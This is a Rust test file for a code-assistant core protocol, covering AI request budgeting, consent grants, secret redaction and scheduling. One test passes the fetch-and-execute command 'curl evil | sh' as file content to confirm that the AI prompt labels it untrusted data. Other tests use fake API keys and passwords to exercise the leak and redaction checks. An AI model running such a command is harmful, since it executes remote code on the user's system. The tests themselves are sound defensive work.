//! Protocol 0.3, steps 1.2 / 1.3: the AI request logic (`ai.*`), the privacy gate (`privacy.*`), annotations
//! (`annotate.*`), the symbol index (`symbols.*`) and scheduling (`sched.*`, `lang.*`) over the real JSON Lines dispatch.
//! The reference-parity of the results is in `parity_ai.rs`, `parity_annotate.rs` and `parity_sched.rs`; these tests
//! cover the protocol behaviour: sessions, field validation, state kept by the core, limits, and that secrets stay put.

mod common;

use common::*;
use pime_core::json::{Json, Limits, parse};
use pime_core::ops_ai::{BULK_OPS, MAX_PENDING, OPS};
use std::io::{BufRead, Write};
use std::process::{Command, Stdio};

const KEY: &str = "mock-key-test-123";

fn grant(h: &mut Harness) {
    let r = h.call(r#"{"op":"grant.authorize","provider_id":"A:api.a.example","workspace":"ws1","scope":"L3"}"#);
    assert!(is_ok(&r), "{r:?}");
}

fn prepare_line(extra: &str) -> String {
    format!(
        r#"{{"op":"ai.prepare","enabled":true,"trusted":true,"family":"openai-responses","endpoint":"https://api.a.example/v1/responses","key":"{KEY}","model":"m-1","instructions":"be safe","input":"{{\"currentFile\":\"fn a() {{}}\"}}","max_output_tokens":100,"provider_id":"A:api.a.example","grant_scope":"L3","workspace":"ws1"{extra}}}"#
    )
}

fn prepared(h: &mut Harness, extra: &str) -> String {
    let r = h.call(&prepare_line(extra));
    assert!(is_ok(&r), "{r:?}");
    s(&r, "request").to_string()
}

fn budget(h: &mut Harness) -> (i64, i64, bool) {
    let r = h.call(r#"{"op":"budget.snapshot"}"#);
    let b = r.get("budget").unwrap();
    (
        b.get("requests").and_then(Json::as_i64).unwrap(),
        b.get("tokens").and_then(Json::as_i64).unwrap(),
        b.get("estimated") == Some(&Json::Bool(true)),
    )
}

#[test]
fn every_new_operation_needs_an_open_session() {
    let mut h = Harness::open();
    for op in OPS {
        let reply = h.core.handle_line(&format!(r#"{{"op":"{op}","id":1}}"#));
        assert!(reply.contains(r#""error":"NO_SESSION""#), "{op}: {reply}");
        let unknown = format!(r#"{{"op":"{op}","id":1,"session":"{}"}}"#, "0".repeat(32));
        let reply = h.core.handle_line(&unknown);
        assert!(reply.contains(r#""error":"NO_SESSION""#), "{op}: {reply}");
    }
    // and with a session an empty request is a named INVALID_REQUEST (or a defined failure), never a panic
    for op in OPS {
        let reply = h
            .core
            .handle_line(&format!(r#"{{"op":"{op}","session":"{}"}}"#, h.session));
        assert!(
            !reply.contains("INTERNAL") && !reply.contains("UNKNOWN_OPERATION"),
            "{op}: {reply}"
        );
    }
}

#[test]
fn only_the_operations_that_carry_text_accept_long_lines() {
    let mut h = Harness::open();
    for op in BULK_OPS {
        assert!(OPS.contains(op), "{op} is a bulk op of the list");
    }
    // 100 KB of reply text is fine for ai.parse (a bulk op) but not for sched.touch
    let long = "x".repeat(100_000);
    let reply = h.core.handle_line(&format!(
        r#"{{"op":"ai.parse","session":"{}","task":"insert","raw":"{{\"insertCandidates\":[\"{long}\"]}}"}}"#,
        h.session
    ));
    assert!(
        reply.contains(r#""ok":true"#),
        "{}",
        &reply[..200.min(reply.len())]
    );
    let reply = h.core.handle_line(&format!(
        r#"{{"op":"sched.touch","session":"{}","kind":"input","pad":"{long}"}}"#,
        h.session
    ));
    assert_eq!(reply, r#"{"ok":false,"error":"PAYLOAD_TOO_LARGE"}"#);
}

#[test]
fn ai_prepare_validates_its_fields_and_the_order_of_the_checks() {
    let mut h = Harness::open();
    grant(&mut h);
    let line = |patch: &dyn Fn(&mut Json)| {
        let mut req = parse(&prepare_line(""), big_limits()).unwrap();
        patch(&mut req);
        req.to_json_string()
    };
    let drop_key = |k: &'static str| {
        move |req: &mut Json| {
            if let Json::Obj(o) = req {
                o.retain(|(key, _)| key != k);
            }
        }
    };
    // required fields
    for field in [
        "enabled",
        "trusted",
        "instructions",
        "input",
        "provider_id",
        "grant_scope",
        "workspace",
    ] {
        let r = h.call(&line(&drop_key(field)));
        assert_eq!(err_code(&r), "INVALID_REQUEST", "{field}");
        assert_eq!(s(&r, "field"), field);
    }
    // an error carries the metadata of the reference error and the budget
    let r = h.call(&line(&|req| {
        if let Json::Obj(o) = req {
            o.iter_mut().find(|(k, _)| k == "model").unwrap().1 = Json::str("");
        }
    }));
    assert_eq!(err_code(&r), "MODEL_UNSUPPORTED");
    assert_eq!(s(&r, "user_action"), "Choose an exact model id");
    assert_eq!(r.get("retryable"), Some(&Json::Bool(false)));
    assert!(r.get("budget").is_some());
    // AI off beats everything else, and nothing is reserved
    let r = h.call(
        &prepare_line("")
            .replace(r#""enabled":true"#, r#""enabled":false"#)
            .replace(r#""model":"m-1""#, r#""model":"""#),
    );
    assert_eq!(err_code(&r), "AI_DISABLED");
    assert_eq!(budget(&mut h), (0, 0, false));
}

#[test]
fn ut_035_prepare_reserves_complete_settles_with_the_real_usage() {
    let mut h = Harness::open();
    grant(&mut h);
    let request = prepared(&mut h, "");
    let (requests, tokens, _) = budget(&mut h);
    assert_eq!(
        (requests, tokens),
        (
            1,
            100 + "be safe\n{\"currentFile\":\"fn a() {}\"}".len().div_ceil(3) as i64
        )
    );
    let body = r#"{"output_text":"{\"insertCandidates\":[\"x\"]}","usage":{"input_tokens":10,"output_tokens":5}}"#;
    let done = h.call(&format!(
        r#"{{"op":"ai.complete","request":"{request}","status":200,"body":{}}}"#,
        q(body)
    ));
    assert!(is_ok(&done), "{done:?}");
    assert_eq!(s(&done, "text"), r#"{"insertCandidates":["x"]}"#);
    assert_eq!(done.get("estimated"), Some(&Json::Bool(false)));
    assert_eq!(budget(&mut h), (1, 15, false));
    // a prepared request is completed exactly once
    let again = h.call(&format!(
        r#"{{"op":"ai.complete","request":"{request}","status":200,"body":{}}}"#,
        q(body)
    ));
    assert_eq!(
        (err_code(&again), s(&again, "field")),
        ("INVALID_REQUEST", "request")
    );
    // a reply without usage is settled with its estimate and the budget says so
    let request = prepared(&mut h, "");
    let done = h.call(&format!(
        r#"{{"op":"ai.complete","request":"{request}","status":200,"body":{}}}"#,
        q(r#"{"output_text":"ok"}"#)
    ));
    assert_eq!(done.get("estimated"), Some(&Json::Bool(true)));
    assert!(budget(&mut h).2);
}

#[test]
fn it_020_a_provider_error_settles_the_reservation_and_a_rate_limit_pauses_ai_until_the_retry_time()
{
    let mut h = Harness::open();
    grant(&mut h);
    let request = prepared(&mut h, "");
    let done = h.call(&format!(
        r#"{{"op":"ai.complete","request":"{request}","status":429,"retry_after":"10"}}"#
    ));
    assert_eq!(err_code(&done), "AI_RATE_LIMIT");
    assert_eq!(
        done.get("retry_after_sec").and_then(Json::as_f64),
        Some(10.0)
    );
    assert_eq!(done.get("retryable"), Some(&Json::Bool(true)));
    // paused: nothing is reserved, nothing can be prepared
    let paused = h.call(&prepare_line(""));
    assert_eq!(err_code(&paused), "AI_RATE_LIMIT");
    assert_eq!(budget(&mut h).0, 1);
    h.clock.advance(9_999);
    assert_eq!(err_code(&h.call(&prepare_line(""))), "AI_RATE_LIMIT");
    h.clock.advance(2);
    assert!(is_ok(&h.call(&prepare_line(""))));
}

#[test]
fn a_response_over_the_size_limit_is_refused_but_still_settled() {
    let mut h = Harness::open();
    grant(&mut h);
    let request = prepared(&mut h, "");
    let flagged = h.call(&format!(
        r#"{{"op":"ai.complete","request":"{request}","status":200,"oversize":true}}"#
    ));
    assert_eq!(
        (err_code(&flagged), s(&flagged, "message")),
        ("OUTPUT_INVALID", "response too large")
    );
    // the same verdict when the whole body is sent (a 4 MiB body fits the bulk line limit)
    let request = prepared(&mut h, "");
    let body = "x".repeat(4 * 1024 * 1024 + 1);
    let sent = h.call(&format!(
        r#"{{"op":"ai.complete","request":"{request}","status":200,"body":"{body}"}}"#
    ));
    assert_eq!(
        (err_code(&sent), s(&sent, "message")),
        ("OUTPUT_INVALID", "response too large")
    );
    let request = prepared(&mut h, "");
    let exact = format!(
        r#"{{"output_text":"{}"}}"#,
        "y".repeat(4 * 1024 * 1024 - 20)
    );
    assert!(is_ok(&h.call(&format!(
        r#"{{"op":"ai.complete","request":"{request}","status":200,"body":{}}}"#,
        q(&exact)
    ))));
    // all three requests were settled: with their estimate, so the budget is "estimated"
    assert!(budget(&mut h).2);
}

#[test]
fn the_oldest_pending_request_is_settled_when_too_many_are_open() {
    let mut h = Harness::open();
    grant(&mut h);
    let first = prepared(&mut h, "");
    for _ in 0..MAX_PENDING {
        prepared(&mut h, "");
    }
    let gone = h.call(&format!(
        r#"{{"op":"ai.complete","request":"{first}","status":200,"body":"{{}}"}}"#
    ));
    assert_eq!(err_code(&gone), "INVALID_REQUEST");
    assert_eq!(budget(&mut h).0, (MAX_PENDING + 1) as i64);
}

#[test]
fn ut_031_the_api_key_only_travels_in_the_prepared_headers() {
    let mut h = Harness::open();
    grant(&mut h);
    let r = h.call(&prepare_line(""));
    let headers = r.get("http").unwrap().get("headers").unwrap();
    assert_eq!(s(headers, "Authorization"), format!("Bearer {KEY}"));
    let without_headers = Json::obj(vec![
        ("url", r.get("http").unwrap().get("url").unwrap().clone()),
        ("body", r.get("http").unwrap().get("body").unwrap().clone()),
        ("effort", r.get("effort").unwrap().clone()),
        ("budget", r.get("budget").unwrap().clone()),
    ]);
    assert!(!without_headers.to_json_string().contains(KEY));
    // every failure answer is free of the key and of the prompt
    let base = prepare_line("");
    for (from, to) in [
        (r#""enabled":true"#, r#""enabled":false"#),
        (r#""family":"openai-responses""#, r#""family":"nope""#),
        (r#""model":"m-1""#, r#""model":"""#),
        (
            r#""endpoint":"https://api.a.example/v1/responses""#,
            r#""endpoint":"http://insecure.example""#,
        ),
        (r#""trusted":true"#, r#""trusted":false"#),
        (r#""grant_scope":"L3""#, r#""grant_scope":"L1""#),
    ] {
        let r = h.call(&base.replace(from, to));
        assert_eq!(r.get("ok"), Some(&Json::Bool(false)), "{from}");
        let text = r.to_json_string();
        assert!(
            !text.contains(KEY) && !text.contains("currentFile"),
            "{text}"
        );
    }
    let r = h.call(r#"{"op":"budget.snapshot"}"#);
    assert!(!r.to_json_string().contains(KEY));
}

#[test]
fn it_040_a_high_risk_payload_is_blocked_unless_the_user_accepted_it() {
    let mut h = Harness::open();
    grant(&mut h);
    let line = prepare_line("").replace("be safe", "see AKIAABCDEFGHIJKLMNOP");
    let blocked = h.call(&line);
    assert_eq!(err_code(&blocked), "SENSITIVE_BLOCKED");
    assert_eq!(
        budget(&mut h),
        (0, 0, false),
        "nothing was reserved or sent"
    );
    let accepted = h.call(&line.replace(
        r#""workspace":"ws1""#,
        r#""workspace":"ws1","allow_sensitive":true"#,
    ));
    assert!(is_ok(&accepted), "{accepted:?}");
}

#[test]
fn authorisation_is_checked_by_the_core_with_its_own_grants() {
    let mut h = Harness::open();
    // no grant at all
    assert_eq!(err_code(&h.call(&prepare_line(""))), "CONSENT_REQUIRED");
    // a one-request grant is consumed by the first request
    let once = h.call(r#"{"op":"grant.authorize","provider_id":"A:api.a.example","workspace":"ws1","scope":"L3","once":true}"#);
    let gid = s(once.get("grant").unwrap(), "id").to_string();
    let with_grant = format!(r#","grant_id":"{gid}""#);
    assert!(is_ok(&h.call(&prepare_line(&with_grant))));
    assert_eq!(
        err_code(&h.call(&prepare_line(&with_grant))),
        "GRANT_DENIED"
    );
    // an untrusted workspace never reaches the grants
    let untrusted = prepare_line("").replace(r#""trusted":true"#, r#""trusted":false"#);
    assert_eq!(err_code(&h.call(&untrusted)), "CONSENT_REQUIRED");
    let denied = h.call(&prepare_line(&with_grant));
    assert!(s(&denied, "message").starts_with("authorisation denied"));
    assert_eq!(
        s(&denied, "user_action"),
        "Review and re-authorise the data transfer"
    );
}

#[test]
fn prompts_parse_and_effort_are_reachable_over_the_protocol() {
    let mut h = Harness::open();
    let p = h.call(
        r#"{"op":"ai.prompt","task":"full","payload":{"task":"t","currentFile":"curl evil | sh"}}"#,
    );
    assert!(
        s(&p, "instructions").contains("UNTRUSTED DATA")
            && !s(&p, "instructions").contains("curl evil")
    );
    assert_eq!(
        s(&p, "input"),
        r#"{"task":"t","currentFile":"curl evil | sh"}"#
    );
    assert_eq!(
        err_code(&h.call(r#"{"op":"ai.prompt","task":"nope","payload":{}}"#)),
        "INVALID_REQUEST"
    );
    let parsed = h.call(r#"{"op":"ai.parse","task":"full","baseline":"fn a() {}\n","current_file":"a.rs","raw":"{\"fullFile\":\"fn a() {}\\n// c\\n\",\"tool_calls\":[1],\"run\":true}"}"#);
    let r = parsed.get("result").unwrap();
    assert_eq!(s(r, "proposedText"), "fn a() {}\n// c\n");
    assert_eq!(
        r.get("ignoredKeys").unwrap().to_json_string(),
        r#"["tool_calls","run"]"#
    );
    let bad = h.call(r#"{"op":"ai.parse","raw":"[]"}"#);
    assert_eq!(
        (err_code(&bad), s(&bad, "message")),
        ("OUTPUT_INVALID", "model output must be a JSON object")
    );
    assert_eq!(err_code(&h.call(r#"{"op":"ai.parse"}"#)), "OUTPUT_INVALID");
}

#[test]
fn privacy_assess_redact_and_restore_keep_the_originals_in_the_core() {
    let mut h = Harness::open();
    let src = "let k = \"sk-abcdefghijklmnopqrstuvwxyz0123\";\nsee C:\\Users\\bob\\x\n";
    let a = h.call(&format!(
        r#"{{"op":"privacy.assess","scope":"f1","text":{}}}"#,
        q(src)
    ));
    assert_eq!(s(&a, "action"), "confirm");
    let scanned = a.get("scanned").unwrap();
    assert_eq!(
        (s(scanned, "highest"), scanned.get("blocked")),
        ("high", Some(&Json::Bool(true)))
    );
    assert!(
        !a.to_json_string().contains("sk-abc"),
        "findings carry no values"
    );
    assert_eq!(
        s(
            &h.call(r#"{"op":"privacy.assess","text":"fn main() {}"}"#),
            "action"
        ),
        "allow"
    );
    assert_eq!(
        s(
            &h.call(r#"{"op":"privacy.assess","text":"x","file_name":".env"}"#),
            "action"
        ),
        "block"
    );
    let r1 = h.call(&format!(r#"{{"op":"privacy.redact","text":{}}}"#, q(src)));
    let id = s(&r1, "redaction").to_string();
    assert!(!s(&r1, "text").contains("sk-abc") && s(&r1, "text").contains("PIME_REDACTED_1"));
    assert_eq!(
        r1.get("count").and_then(Json::as_i64),
        Some(r1.get("total").and_then(Json::as_i64).unwrap())
    );
    let restored = h.call(&format!(
        r#"{{"op":"privacy.restore","redaction":"{id}","text":{}}}"#,
        q(s(&r1, "text"))
    ));
    assert_eq!(s(&restored, "text"), src);
    assert_eq!(restored.get("unresolved").and_then(Json::as_i64), Some(0));
    // a second part joins the same set; the map never appears in a reply
    let r2 = h.call(&format!(
        r#"{{"op":"privacy.redact","redaction":"{id}","text":"password = \"hunter2hunter2\""}}"#
    ));
    assert_eq!(s(&r2, "redaction"), id);
    assert_eq!(
        r2.get("total").and_then(Json::as_i64),
        Some(r1.get("count").and_then(Json::as_i64).unwrap() + 1)
    );
    assert!(!r1.to_json_string().contains("hunter2") && !r2.to_json_string().contains("hunter2"));
    // every part is numbered from 1, so a marker that two parts share goes to the later one (as in the reference)
    let shared = h.call(&format!(
        r#"{{"op":"privacy.restore","redaction":"{id}","text":"PIME_REDACTED_1"}}"#
    ));
    assert_eq!(s(&shared, "text"), "hunter2hunter2");
    let unknown = h.call(&format!(
        r#"{{"op":"privacy.restore","redaction":"{id}","text":"PIME_REDACTED_99"}}"#
    ));
    assert_eq!(unknown.get("unresolved").and_then(Json::as_i64), Some(1));
    assert_eq!(
        h.call(&format!(r#"{{"op":"privacy.release","redaction":"{id}"}}"#))
            .get("released"),
        Some(&Json::Bool(true))
    );
    assert_eq!(
        err_code(&h.call(&format!(
            r#"{{"op":"privacy.restore","redaction":"{id}","text":"x"}}"#
        ))),
        "INVALID_REQUEST"
    );
    assert_eq!(
        h.call(&format!(r#"{{"op":"privacy.release","redaction":"{id}"}}"#))
            .get("released"),
        Some(&Json::Bool(false))
    );
    // sets are per session
    let other = h.open_another(9);
    let r = h.call(&format!(
        r#"{{"op":"privacy.redact","session":"{other}","text":"x"}}"#
    ));
    assert!(is_ok(&r));
}

#[test]
fn annotate_and_symbol_operations_return_the_reference_results() {
    let mut h = Harness::open();
    let r =
        h.call(r#"{"op":"annotate.supports","language":"assembly","dialect":{"assembler":"gas"}}"#);
    assert_eq!(
        (r.get("supported"), s(&r, "prefix")),
        (Some(&Json::Bool(true)), "#")
    );
    assert_eq!(
        h.call(r#"{"op":"annotate.supports","language":"cobol"}"#)
            .get("prefix"),
        Some(&Json::Null)
    );
    let apply = h.call(r#"{"op":"annotate.apply","profile":"rust","original":"fn ${name}() {}","comment":true,"graph":true,"raw":"{\"commented\":\"// a ${x}\\nfn ${name}() {}\",\"cypher\":[\"MERGE (n)\",\"DELETE n\"]}"}"#);
    assert_eq!(
        s(&apply, "text"),
        "// [graph] Cypher - node/edge relations of this block:\n// MERGE (n)\n// a $ {x}\nfn ${name}() {}"
    );
    assert_eq!(
        (apply.get("commented"), apply.get("graph")),
        (Some(&Json::Bool(true)), Some(&Json::Bool(true)))
    );
    let invalid = h.call(
        r#"{"op":"annotate.apply","profile":"rust","original":"x","comment":true,"raw":"nope"}"#,
    );
    assert_eq!(
        invalid.get("notes").unwrap().to_json_string(),
        r#"["reply-invalid"]"#
    );
    assert_eq!(invalid.get("commented"), None);
    let add = h.call(r#"{"op":"annotate.f1_addendum","task":"insert","comment":true,"language":"python","locale":"ja-JP"}"#);
    assert!(
        s(&add, "text").starts_with(" Add very detailed") && s(&add, "text").contains("Japanese")
    );
    let prompt = h.call(r#"{"op":"annotate.prompt","language":"rust","comment":true,"graph":true,"locale":"zh-CN","file_name":"a.rs","file_text":"fn a() {}","snippet":"fn b() {}","line":3,"current_symbols":[{"kind":"fn","name":"a"}]}"#);
    assert!(s(&prompt, "instructions").contains("Simplified Chinese"));
    let input = parse(s(&prompt, "input"), Limits::DEFAULT).unwrap();
    assert_eq!(input.get("insertedAtLine").and_then(Json::as_i64), Some(3));
    assert_eq!(
        input.get("directorySymbols").unwrap().to_json_string(),
        "[]"
    );
    let sym = h.call(r#"{"op":"symbols.extract","language":"rust","text":"pub struct P;\nfn f() {}\nfn g() {}\n","max":2}"#);
    assert_eq!(
        sym.get("symbols").unwrap().to_json_string(),
        r#"[{"kind":"struct","name":"P"},{"kind":"fn","name":"f"}]"#
    );
    assert_eq!(
        h.call(r#"{"op":"symbols.extract","language":"cobol","text":"x"}"#)
            .get("symbols")
            .unwrap()
            .to_json_string(),
        "[]"
    );
    let dir = h.call(r#"{"op":"symbols.dir_candidates","current_name":"a.rs","entries":[{"name":"a.rs","is_file":true},{"name":"b.py","is_file":true},{"name":".env","is_file":true},{"name":"d","is_file":false}]}"#);
    assert_eq!(
        dir.get("candidates").unwrap().to_json_string(),
        r#"[{"name":"b.py","language":"python"}]"#
    );
    assert_eq!(
        err_code(&h.call(
            r#"{"op":"symbols.dir_candidates","current_name":"a","entries":[{"name":"x"}]}"#
        )),
        "INVALID_REQUEST"
    );
}

#[test]
fn ut_039_the_core_decides_when_to_send_and_which_result_is_stale() {
    let mut h = Harness::open();
    let key = |seq: i64| format!(r#"{{"seq":{seq},"profileEpoch":0,"documentEpoch":0}}"#);
    let r = h.call(r#"{"op":"sched.configure","debounce_ms":5}"#);
    assert_eq!(r.get("debounce_ms").and_then(Json::as_i64), Some(150));
    h.call(r#"{"op":"sched.configure"}"#);
    let r = h.call(&format!(
        r#"{{"op":"sched.schedule","key":{},"allowed":true}}"#,
        key(10)
    ));
    assert_eq!(
        r.get("effects").unwrap().to_json_string(),
        r#"{"clear_timer":true,"abort":true,"arm_ms":350}"#
    );
    assert_eq!(
        h.call(&format!(
            r#"{{"op":"sched.fire","key":{},"allowed":true}}"#,
            key(10)
        ))
        .get("start"),
        Some(&Json::Bool(true))
    );
    // newer input: the running request is stale at once
    h.call(&format!(
        r#"{{"op":"sched.schedule","key":{},"allowed":true}}"#,
        key(11)
    ));
    let r = h.call(&format!(
        r#"{{"op":"sched.finish","key":{},"ok":true}}"#,
        key(10)
    ));
    assert_eq!(
        (s(&r, "action"), s(&r, "code")),
        ("discard", "STALE_RESULT")
    );
    assert_eq!(
        h.call(&format!(
            r#"{{"op":"sched.fire","key":{},"allowed":false}}"#,
            key(11)
        ))
        .get("start"),
        Some(&Json::Bool(false))
    );
    assert_eq!(
        h.call(&format!(
            r#"{{"op":"sched.fire","key":{},"allowed":true}}"#,
            key(11)
        ))
        .get("start"),
        Some(&Json::Bool(true))
    );
    let r = h.call(&format!(
        r#"{{"op":"sched.finish","key":{},"ok":false,"code":"AI_TIMEOUT"}}"#,
        key(11)
    ));
    assert_eq!((s(&r, "action"), s(&r, "code")), ("discard", "AI_TIMEOUT"));
    let stats = r.get("stats").unwrap();
    assert_eq!(stats.get("started").and_then(Json::as_i64), Some(2));
    assert_eq!(stats.get("discarded").and_then(Json::as_i64), Some(2));
    // pause: nothing is armed
    let r = h.call(&format!(
        r#"{{"op":"sched.schedule","key":{},"allowed":false}}"#,
        key(12)
    ));
    assert_eq!(r.get("effects").unwrap().get("arm_ms"), Some(&Json::Null));
    let c = h.call(r#"{"op":"sched.cancel"}"#);
    assert_eq!(
        c.get("effects").unwrap().get("clear_timer"),
        Some(&Json::Bool(true))
    );
    assert_eq!(
        h.call(&format!(
            r#"{{"op":"sched.fire","key":{},"allowed":true}}"#,
            key(12)
        ))
        .get("start"),
        Some(&Json::Bool(false))
    );
    assert_eq!(err_code(&h.call(r#"{"op":"sched.schedule","key":{"seq":-1,"profileEpoch":0,"documentEpoch":0},"allowed":true}"#)), "INVALID_REQUEST");
    assert_eq!(
        err_code(
            &h.call(
                r#"{"op":"sched.schedule","key":{"seq":1,"profileEpoch":0,"documentEpoch":0}}"#
            )
        ),
        "INVALID_REQUEST"
    );
}

#[test]
fn epochs_and_language_locks_live_in_the_session() {
    let mut h = Harness::open();
    let touch =
        |h: &mut Harness, kind: &str| h.call(&format!(r#"{{"op":"sched.touch","kind":"{kind}"}}"#));
    assert_eq!(
        touch(&mut h, "input")
            .get("key")
            .unwrap()
            .get("seq")
            .and_then(Json::as_i64),
        Some(1)
    );
    touch(&mut h, "input");
    assert_eq!(
        touch(&mut h, "document")
            .get("key")
            .unwrap()
            .get("documentEpoch")
            .and_then(Json::as_i64),
        Some(1)
    );
    let l = h.call(r#"{"op":"sched.touch","kind":"language","language":"rust"}"#);
    assert_eq!(
        (
            l.get("changed"),
            l.get("key")
                .unwrap()
                .get("profileEpoch")
                .and_then(Json::as_i64)
        ),
        (Some(&Json::Bool(true)), Some(1))
    );
    let same = h.call(r#"{"op":"sched.touch","kind":"language","language":"rust"}"#);
    assert_eq!(same.get("changed"), Some(&Json::Bool(false)));
    assert_eq!(
        err_code(&h.call(r#"{"op":"sched.touch","kind":"nope"}"#)),
        "INVALID_REQUEST"
    );
    let key = l.get("key").unwrap().to_json_string();
    assert_eq!(
        h.call(&format!(r#"{{"op":"sched.is_current","key":{key}}}"#))
            .get("current"),
        Some(&Json::Bool(true))
    );
    touch(&mut h, "input");
    assert_eq!(
        h.call(&format!(r#"{{"op":"sched.is_current","key":{key}}}"#))
            .get("current"),
        Some(&Json::Bool(false))
    );
    assert_eq!(
        h.call(r#"{"op":"sched.is_current","key":null}"#)
            .get("current"),
        Some(&Json::Bool(false))
    );
    // locks beat automatic detection, and a file lock beats the global one
    let r = h.call(r#"{"op":"lang.lock","profile":"typescript","scope":"global"}"#);
    assert_eq!(r.get("locked"), Some(&Json::Bool(true)));
    assert_eq!(
        h.call(r#"{"op":"lang.lock","profile":"cobol"}"#)
            .get("locked"),
        Some(&Json::Bool(false))
    );
    h.call(r#"{"op":"lang.lock","profile":"c","scope":"file","file_key":"f1"}"#);
    let st = h.call(
        r#"{"op":"lang.state","language_id":"rust","file_name":"x.rs","file_key":"f1","text":""}"#,
    );
    assert_eq!(s(st.get("decision").unwrap(), "language"), "c");
    let st =
        h.call(r#"{"op":"lang.state","language_id":"rust","file_name":"x.rs","file_key":"zzz"}"#);
    assert_eq!(s(st.get("decision").unwrap(), "language"), "typescript");
    let u = h.call(r#"{"op":"lang.unlock","scope":"global"}"#);
    assert_eq!(u.get("global_lock"), Some(&Json::Null));
    assert_eq!(
        u.get("file_locks").unwrap().to_json_string(),
        r#"{"f1":"c"}"#
    );
    let st =
        h.call(r#"{"op":"lang.state","language_id":"rust","file_name":"x.rs","file_key":"zzz"}"#);
    assert_eq!(s(st.get("decision").unwrap(), "language"), "rust");
    assert_eq!(
        err_code(&h.call(r#"{"op":"lang.lock","profile":"rust","scope":"nowhere"}"#)),
        "INVALID_REQUEST"
    );
    // sessions are independent
    let other = h.open_another(7);
    let r = h.call(&format!(
        r#"{{"op":"sched.touch","session":"{other}","kind":"input"}}"#
    ));
    assert_eq!(
        r.get("key").unwrap().get("seq").and_then(Json::as_i64),
        Some(1)
    );
}

#[test]
fn the_schema_documents_every_new_operation_and_error_metadata() {
    let path = format!(
        "{}/../../schemas/core-protocol-v0.3.json",
        env!("CARGO_MANIFEST_DIR")
    );
    let raw = std::fs::read_to_string(path).expect("schema file");
    parse(&raw, big_limits()).expect("schema is valid JSON");
    for op in OPS {
        assert!(
            raw.contains(&format!("\"const\": \"{op}\"")),
            "schema lacks request op {op}"
        );
    }
    for field in [
        "retry_after_sec",
        "user_action",
        "max_response_units",
        "oversize",
        "transport_error",
        "redaction",
    ] {
        assert!(raw.contains(field), "schema lacks {field}");
    }
}

#[test]
fn the_real_binary_serves_prepare_and_complete() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_pime-core"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn pime-core");
    let mut stdin = child.stdin.take().expect("stdin");
    let mut reader = std::io::BufReader::new(child.stdout.take().expect("stdout"));
    let mut ask = |line: &str| -> Json {
        stdin.write_all(line.as_bytes()).unwrap();
        stdin.write_all(b"\n").unwrap();
        stdin.flush().unwrap();
        let mut out = String::new();
        reader.read_line(&mut out).unwrap();
        parse(&out, big_limits()).unwrap_or_else(|e| panic!("{e}: {out}"))
    };
    let opened = ask(&format!(
        r#"{{"op":"session.open","locale":"en-US","entropy":"{ENTROPY}","id":1}}"#
    ));
    let sid = s(&opened, "session").to_string();
    let g = ask(&format!(
        r#"{{"op":"grant.authorize","session":"{sid}","id":2,"provider_id":"A:api.a.example","workspace":"ws1","scope":"L3"}}"#
    ));
    assert!(is_ok(&g));
    let line = prepare_line(&format!(r#","session":"{sid}","id":3"#));
    let prep = ask(&line);
    assert!(is_ok(&prep), "{prep:?}");
    let request = s(&prep, "request").to_string();
    let done = ask(&format!(
        r#"{{"op":"ai.complete","session":"{sid}","id":4,"request":"{request}","status":200,"body":{}}}"#,
        q(r#"{"output_text":"hi","usage":{"input_tokens":1,"output_tokens":2}}"#)
    ));
    assert_eq!(
        (s(&done, "text"), done.get("estimated")),
        ("hi", Some(&Json::Bool(false)))
    );
    drop(stdin);
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success());
    assert!(out.stderr.is_empty(), "the core writes nothing to stderr");
}
